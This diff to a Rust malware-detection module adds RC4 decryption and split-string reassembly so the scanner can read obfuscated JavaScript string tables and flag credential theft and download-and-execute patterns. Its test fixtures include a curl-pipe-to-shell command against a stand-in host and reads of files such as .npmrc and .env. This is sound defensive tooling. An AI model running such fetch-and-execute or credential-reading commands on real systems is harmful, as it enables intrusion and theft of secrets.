@@ -5,15 +5,17 @@
 //! (`fs[_0x5d1b(0x1be)](p)`), so no rule sees `readFileSync(` or a URL.
 //! The array itself still holds the names: decode it, then ask which kinds
 //! of behaviour those names add up to. Options it may have used:
-//! `stringArrayEncoding: base64` (custom alphabet, decoded here) and
-//! `splitStrings` (literals cut into 10-char pieces and shuffled, so
-//! `powershell` and `"irm https` arrive as separate entries).
+//! `stringArrayEncoding: base64` (custom alphabet, decoded here), `rc4`
+//! (decoded with the keys found at the call sites) and `splitStrings`
+//! (literals cut into fixed-length pieces and shuffled, so `powershell` and
+//! `"irm https` arrive as separate entries, and a name may be cut in two).
 //!
-//! shortcut: the `rc4` encoding needs the per-call key and is not decoded;
-//! such files keep only the plain Obfuscator.io finding.
+//! shortcut: a name cut into three or more pieces is not reassembled; that
+//! needs the call sites resolved through the array rotation.
 
 use crate::RuleMatch;
 use regex::Regex;
+use std::collections::BTreeSet;
 use std::sync::LazyLock;
 
 pub const OBFUSCATED_CREDENTIAL_THEFT: &str = "Chain: Obfuscated Credential Theft";
@@ -27,6 +29,13 @@ static LITERAL: LazyLock<Regex> =
     LazyLock::new(|| Regex::new(r#"'((?:[^'\\]|\\.)*)'|"((?:[^"\\]|\\.)*)""#).unwrap());
 static ESCAPE: LazyLock<Regex> =
     LazyLock::new(|| Regex::new(r"\\x([0-9a-fA-F]{2})|\\u([0-9a-fA-F]{4})").unwrap());
+
+/// An rc4 key at a call site: `_0x59af(0x12f,'bYDK')`, either argument order.
+static RC4_KEY: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"[(,]\s*'([^'\\]{4})'\s*[,)]").unwrap());
+/// The obfuscator draws its keys from a pool of 50; other 4-char literals
+/// in call arguments are tried too and decode to nothing.
+const MAX_RC4_KEYS: usize = 128;
 
 /// The obfuscator's base64 alphabet: lower case first.
 const OBF_ALPHABET: &[u8] = b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/";
@@ -67,6 +76,77 @@ fn readable(s: &str) -> bool {
         && s.chars().filter(|c| c.is_ascii_alphanumeric()).count() * 2 >= s.chars().count()
 }
 
+/// RC4 key schedule.
+fn rc4_state(key: &[u8]) -> [u8; 256] {
+    let mut s: [u8; 256] = std::array::from_fn(|i| i as u8);
+    let mut j = 0u8;
+    for i in 0..256 {
+        j = j.wrapping_add(s[i]).wrapping_add(key[i % key.len()]);
+        s.swap(i, j as usize);
+    }
+    s
+}
+
+/// `cipher` under the key behind `state`, if it comes out as printable
+/// ASCII; a wrong key fails within a byte or two.
+fn rc4_printable(mut s: [u8; 256], cipher: &[u8]) -> Option<String> {
+    let (mut i, mut j) = (0u8, 0u8);
+    let mut out = String::with_capacity(cipher.len());
+    for &c in cipher {
+        i = i.wrapping_add(1);
+        j = j.wrapping_add(s[i as usize]);
+        s.swap(i as usize, j as usize);
+        let p = c ^ s[s[i as usize].wrapping_add(s[j as usize]) as usize];
+        if !(0x20..0x7f).contains(&p) {
+            return None;
+        }
+        out.push(p as char);
+    }
+    Some(out)
+}
+
+/// `stringArrayEncoding: rc4`: each entry is base64 of RC4 ciphertext and
+/// the key is a literal at the call site. Which key belongs to which entry
+/// depends on the array rotation, so every key is tried on every entry and
+/// whatever decrypts to printable text is kept. Empty unless most entries
+/// decrypt: a plain table must stay as it is.
+fn rc4_table(content: &str, raw: &[String]) -> Vec<String> {
+    let keys: BTreeSet<&str> = RC4_KEY
+        .captures_iter(content)
+        .filter_map(|c| c.get(1).map(|m| m.as_str()))
+        .collect();
+    let states: Vec<[u8; 256]> = keys
+        .iter()
+        .take(MAX_RC4_KEYS)
+        .map(|k| rc4_state(k.as_bytes()))
+        .collect();
+    let mut out = Vec::new();
+    let mut decrypted = 0;
+    for entry in raw {
+        // The ciphertext was UTF-8 encoded before base64: one char per byte.
+        let Some(cipher) = obf_base64(entry).and_then(|d| {
+            d.chars()
+                .map(|c| u8::try_from(c as u32).ok())
+                .collect::<Option<Vec<u8>>>()
+        }) else {
+            continue;
+        };
+        // Shorter than the shortest name the chains look for: a wrong key
+        // passes too easily and the right one adds nothing.
+        if cipher.len() < 3 {
+            continue;
+        }
+        let before = out.len();
+        out.extend(states.iter().filter_map(|s| rc4_printable(*s, &cipher)));
+        decrypted += usize::from(out.len() > before);
+    }
+    if decrypted * 5 >= raw.len() * 3 {
+        out
+    } else {
+        Vec::new()
+    }
+}
+
 /// The decoded string table of an obfuscated file; empty when there is none.
 pub fn string_table(content: &str) -> Vec<String> {
     let raw: Vec<String> = STRING_ARRAY
@@ -84,16 +164,50 @@ pub fn string_table(content: &str) -> Vec<String> {
         .filter_map(|s| obf_base64(s).filter(|d| readable(d)))
         .collect();
     if decoded.len() * 5 >= raw.len() * 3 && !decoded.is_empty() {
-        decoded
-    } else {
+        return decoded;
+    }
+    let rc4 = rc4_table(content, &raw);
+    if rc4.is_empty() {
         raw
+    } else {
+        rc4
     }
 }
 
+/// `splitStrings` cuts every literal into chunks of one length, so most
+/// entries share it: the chunk length, when at least 2 in 5 entries have it.
+fn chunk_len(table: &[String]) -> Option<usize> {
+    let mut counts = std::collections::BTreeMap::new();
+    for s in table {
+        *counts.entry(s.len()).or_insert(0usize) += 1;
+    }
+    let (&len, &n) = counts.iter().max_by_key(|(_, &n)| n)?;
+    (len >= 3 && n * 5 >= table.len() * 2).then_some(len)
+}
+
+/// A name cut across two chunks: `readF` + `ileSy` for `readfile`. The head
+/// must be a full chunk and each side at least 3 characters, so `thread` +
+/// `filename` in an unsplit table is not a file read.
+fn straddles(lower: &[String], chunk: usize, needle: &str) -> Option<String> {
+    (3..needle.len().saturating_sub(2)).find_map(|k| {
+        let (head, tail) = needle.split_at(k);
+        let h = lower
+            .iter()
+            .find(|s| s.len() == chunk && s.ends_with(head))?;
+        let t = lower.iter().find(|s| s.starts_with(tail))?;
+        Some(format!("{}{}", h, t))
+    })
+}
+
 fn any_contains(table: &[String], needles: &[&str]) -> Option<String> {
-    table.iter().find_map(|s| {
+    let whole = table.iter().find_map(|s| {
         let lower = s.to_ascii_lowercase();
         needles.iter().any(|n| lower.contains(n)).then(|| s.clone())
+    });
+    whole.or_else(|| {
+        let chunk = chunk_len(table)?;
+        let lower: Vec<String> = table.iter().map(|s| s.to_ascii_lowercase()).collect();
+        needles.iter().find_map(|n| straddles(&lower, chunk, n))
     })
 }
 
@@ -235,6 +349,72 @@ mod tests {
             names(&chains("ext.js", &table)),
             vec![OBFUSCATED_DOWNLOAD_EXEC]
         );
+    }
+
+    #[test]
+    fn rc4_table_is_decrypted_with_the_call_site_keys() {
+        // Shape of `--string-array-encoding rc4` output (javascript-obfuscator 5.10).
+        let entries = [
+            ("readFileSync", "bYDK"),
+            ("/.npmrc", "Zo]n"),
+            ("POST", "uLOo"),
+            ("child_process", "0[5O"),
+            ("curl https://collect.example.net/x.sh | sh", "ZkI5"),
+        ];
+        let array = entries
+            .iter()
+            .map(|(plain, key)| {
+                let mut s = rc4_state(key.as_bytes());
+                let (mut i, mut j) = (0u8, 0u8);
+                let cipher: String = plain
+                    .bytes()
+                    .map(|b| {
+                        i = i.wrapping_add(1);
+                        j = j.wrapping_add(s[i as usize]);
+                        s.swap(i as usize, j as usize);
+                        (b ^ s[s[i as usize].wrapping_add(s[j as usize]) as usize]) as char
+                    })
+                    .collect();
+                format!("'{}'", encode(&cipher))
+            })
+            .collect::<Vec<_>>()
+            .join(",");
+        // Keys sit at the call sites, in either argument position.
+        let calls = "fs[a0(0x13a,'bYDK')](p+a0(0x14c,'Zo]n'));x(a0(0x142,'uLOo'));\
+                     require(b0('0[5O',0x131))[b0('ZkI5',0x14b)]();";
+        let src = format!("const _0x1a1c4a=[{}];{}", array, calls);
+        let table = string_table(&src);
+        assert!(table.contains(&"readFileSync".to_string()), "{:?}", table);
+        assert_eq!(
+            names(&chains("index.js", &table)),
+            vec![OBFUSCATED_CREDENTIAL_THEFT, OBFUSCATED_DOWNLOAD_EXEC]
+        );
+        // Without the keys nothing decrypts and the table stays raw.
+        let keyless = format!("const _0x1a1c4a=[{}];", array);
+        assert!(chains("index.js", &string_table(&keyless)).is_empty());
+    }
+
+    #[test]
+    fn names_cut_across_two_chunks_are_found() {
+        // `--split-strings-chunk-length 5`: readFileSync, execSync, "curl https".
+        let split: Vec<String> = [
+            "readF", "ileSy", "nc", "execS", "ync", "curl ", "https", "://ex", "ample", "POST",
+            ".env",
+        ]
+        .iter()
+        .map(|s| s.to_string())
+        .collect();
+        assert_eq!(
+            names(&chains("index.js", &split)),
+            vec![OBFUSCATED_CREDENTIAL_THEFT, OBFUSCATED_DOWNLOAD_EXEC]
+        );
+        // An unsplit table has no common chunk length: `thread` + `filename`
+        // is not a file read.
+        let plain: Vec<String> = ["thread", "filename", ".env", "post", "constructor", "a"]
+            .iter()
+            .map(|s| s.to_string())
+            .collect();
+        assert!(chains("index.js", &plain).is_empty());
     }
 
     #[test]
